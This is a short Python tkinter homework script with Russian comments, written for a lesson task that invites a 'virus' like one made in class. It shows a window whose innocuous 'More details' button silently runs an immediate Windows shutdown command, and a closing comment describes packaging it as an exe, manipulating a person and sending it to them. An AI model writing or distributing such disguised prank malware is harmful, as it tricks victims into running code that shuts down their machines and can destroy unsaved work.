#Собавья бега (Задание №3, Урок 8)
#Задача: Придумайте и напишите свое оконное приложение. Это может быть вирус, подобный тому, 
# что мы сделали на уроке. Или кликер с несколькими кнопками. Можно сделать фотоальбом, 
# в котором при нажатии на разные кнопки открываются разные картинки.

#когдая учился этому, наш спикер, который на вебинаре создал вирус, положил трансляцию экрана :)))



#Ответ:

from tkinter import * 
import os 

window = Tk()

window.geometry('700x330')
# window.protocol('WM_DELETE_WINDOW', False)
window.resizable(width= False, height= False)

def check():
    shutdown_command="shutdown /s /t 00"
    os.system(shutdown_command)

knopka1 = Button(text='Подробнее', font=('Arial', 20), fg='black', command=check)
knopka1.place(x= 100, y=50)

window.mainloop()

#Преобразуем в exe, делаем махинации с человеком и отправляем ему exe и кароче так далее....